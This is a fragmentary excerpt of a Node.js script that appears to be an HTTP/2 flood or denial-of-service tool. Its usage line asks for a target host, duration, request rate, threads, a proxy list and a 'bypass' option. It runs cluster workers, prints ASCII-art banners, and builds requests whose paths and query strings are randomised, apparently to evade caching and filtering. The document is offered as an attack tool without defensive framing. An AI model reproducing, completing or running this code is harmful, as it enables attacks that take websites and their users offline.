...
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt bypass`); process.exit();}
 ...
 if (cluster.isMaster) {
    ...
    console['log']('─────▄█░░▀▀▀▀▀░░█▄'['yellow']['bold']);       
    console['log']('─▄▄──█░░░░░░░░░░░█──▄▄[Info] me may beo'['yellow']['bold']); 
    console['log']('█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█'['yellow']['bold']);
...
let headers = {
  ...
  ":scheme": "https",
  ":path":parsedTarget.path.replace(/%RAND%/, () => Array.from({ length: 16 }, () => Math.floor(Math.random() * 36).toString(36)).join('')) + "?" + randstr(3) + "=" +generateRandomString(3,6),
  ":method": "GET",
